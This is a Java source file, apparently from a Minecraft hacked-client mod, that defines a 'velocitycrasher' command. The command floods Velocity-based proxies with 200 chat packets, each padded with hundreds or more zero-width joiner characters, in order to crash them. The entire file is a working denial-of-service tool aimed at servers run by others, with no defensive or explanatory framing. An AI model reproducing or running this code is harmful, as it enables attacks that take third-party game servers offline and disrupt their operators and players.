package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.command.Command;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import net.minecraft.command.CommandSource;

/**
 * Command: Velocity Proxy Crasher
 * 
 * This command attempts to exploit velocity-based proxies by sending
 * spammed chat messages containing a zero-width joiner character.
 *
 * Usage:
 *   - /velocitycrasher <server> <power>
 * 
 * Arguments:
 *   - server: the target server name (String)
 *   - power:  the number of zero-width characters to repeat (min: 200)
 */
public class VelocityCrasherCommand extends Command {

    public VelocityCrasherCommand() {
        super("velocitycrasher", "Velocity proxy crasher");
    }

    /**
     * Registers this command's structure with Brigadier.
     */
    @Override
    public void register(LiteralArgumentBuilder<CommandSource> root) {
        LiteralArgumentBuilder<CommandSource> literal = root.executes(ctx -> executeDefault(ctx));

        // "server" argument
        RequiredArgumentBuilder<CommandSource, String> serverArg =
                RequiredArgumentBuilder.argument("server", StringArgumentType.word())
                        .executes(ctx -> executeDefault(ctx));

        // "power" argument
        RequiredArgumentBuilder<CommandSource, Integer> powerArg =
                RequiredArgumentBuilder.argument("power", IntegerArgumentType.integer(200))
                        .executes(ctx -> executeAttack(ctx));

        // Chain arguments together
        serverArg.then(powerArg);
        literal.then(serverArg);
    }

    /**
     * Executes the exploit logic when both arguments are provided.
     */
    private int executeAttack(CommandContext<CommandSource> ctx) {
        Runnable task = () -> {
            if (this.getMinecraftClient().player == null
                    || this.getMinecraftClient().getNetworkHandler() == null) {
                return;
            }

            ClientPlayNetworkHandler net = this.getMinecraftClient().getNetworkHandler();
            String server = ctx.getArgument("server", String.class);
            int power = ctx.getArgument("power", Integer.class);

            String filler = "\u200d"; // Zero-width joiner
            String msg = "server " + server + " " + filler.repeat(power);

            for (int i = 0; i < 200; i++) {
                net.sendPacket(new ChatMessageC2SPacket(msg));
            }

            try {
                Thread.sleep(50L);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
            }
        };

        new Thread(task, "VelocityCrasher").start();
        return 1;
    }

    /**
     * Default executor when arguments are missing.
     */
    private int executeDefault(CommandContext<CommandSource> ctx) {
        return 1;
    }
}
